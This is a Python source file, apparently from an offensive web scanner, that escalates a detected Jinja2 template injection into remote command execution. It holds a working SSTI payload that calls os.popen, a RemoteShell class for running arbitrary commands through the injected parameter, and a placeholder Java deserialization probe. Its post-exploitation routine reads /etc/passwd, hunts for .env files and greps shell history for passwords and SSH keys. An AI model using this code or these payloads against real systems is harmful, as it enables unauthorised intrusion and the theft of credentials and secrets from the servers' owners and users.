import asyncio
from typing import Dict, Any, Optional, Callable
from urllib.parse import urljoin

import httpx


class RemoteShell:
    """
    Thin helper that reuses an existing injection vector to run arbitrary
    commands. It only knows how to interpolate the {cmd} placeholder into
    a payload template and send it through a single query parameter.
    """

    def __init__(self, client: httpx.AsyncClient, url: str, param: str, template: str):
        self.client = client
        self.url = url
        self.param = param
        self.template = template

    async def execute(self, cmd: str) -> str:
        payload = self.template.replace("{cmd}", cmd)
        resp = await self.client.get(self.url, params={self.param: payload})
        return resp.text


class RCETriggerEngine:
    """
    Executes REAL RCE probes when SSTI / Deserialization primitives are detected.
    Designed to be side‑effect free outside the target (no local shells/files).
    """

    def __init__(self, base_url: str, client: httpx.AsyncClient, log: Callable[[str, str, str], None]):
        self.base_url = base_url.rstrip("/")
        self.client = client
        self.log = log

    async def trigger_rce(self, vuln_type: str, endpoint: str, param: str) -> Dict[str, Any]:
        url = endpoint if endpoint.startswith("http") else urljoin(self.base_url + "/", endpoint.lstrip("/"))

        if vuln_type == "ssti_jinja":
            # Try a small command chain to prove code execution.
            template = "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}"
            commands = ["id", "whoami", "ifconfig -a"]
            outputs: Dict[str, str] = {}

            for cmd in commands:
                try:
                    resp = await self.client.get(url, params={param: template.replace("{cmd}", cmd)})
                    outputs[cmd] = resp.text[:2000]
                except Exception as exc:  # pragma: no cover - defensive
                    outputs[cmd] = f"[error executing {cmd}: {exc}]"

            success = any("uid=" in out or "gid=" in out for out in outputs.values())
            if success:
                self.log(f"[RCE] SSTI→RCE confirmed at {endpoint} param={param}", "error", "exploit")
                shell = RemoteShell(self.client, url, param, template)
                return {"rce": True, "outputs": outputs, "shell": shell}
            return {"rce": False, "outputs": outputs}

        if vuln_type == "deserialization":
            # Minimal ysoserial-style probe; real gadget crafting should be
            # injected here when the toolchain is available.
            payload = self.generate_ysoserial_payload("CommonsCollections1", "id")
            try:
                resp = await self.client.post(
                    url,
                    content=payload,
                    headers={"Content-Type": "application/x-java-serialized-object"},
                    timeout=httpx.Timeout(10.0, connect=5.0),
                )
                body = resp.text[:4000]
                success = "uid=" in body or "gid=" in body or "id(" in body.lower()
                self.log(
                    f"[RCE] Deserialization probe sent to {endpoint} ({'hit' if success else 'no hit'})",
                    "error" if success else "warn",
                    "exploit",
                )
                return {"rce": success, "outputs": {"id": body}}
            except Exception as exc:
                return {"rce": False, "error": str(exc)}

        return {"rce": False, "error": f"Unsupported vuln_type {vuln_type}"}

    def generate_ysoserial_payload(self, gadget: str, command: str) -> bytes:
        """
        Placeholder that returns a very small Java serialization header with the
        command embedded as a marker. In a full environment this should call
        ysoserial or marshalsec; here we keep it self contained.
        """
        marker = f"RCE_CMD:{command}".encode()
        return b"\xac\xed\x00\x05" + marker  # Java serialization stream header + marker


class PostExploitationEngine:
    """
    After RCE is confirmed, run a compact checklist to harvest quick wins.
    """

    def __init__(self, log: Callable[[str, str, str], None]):
        self.log = log

    async def post_rce_actions(self, shell_access: RemoteShell) -> Dict[str, str]:
        commands = [
            "cat /etc/passwd",
            "find / -name '*.env' 2>/dev/null",
            "ps aux | grep -E '(mysql|postgres|redis|nginx|apache)'",
            "ifconfig -a",
            "cat ~/.bash_history | grep -E '(password|pass|senha|ssh|key)'",
        ]
        results: Dict[str, str] = {}

        for cmd in commands:
            try:
                output = await shell_access.execute(cmd)
                if output:
                    results[cmd] = output[:1000]
                    self.log(f"[POST-RCE] {cmd} ⇒ captured {len(output)} bytes", "error", "exploit")
            except Exception as exc:  # pragma: no cover - defensive
                results[cmd] = f"[error: {exc}]"

        return results
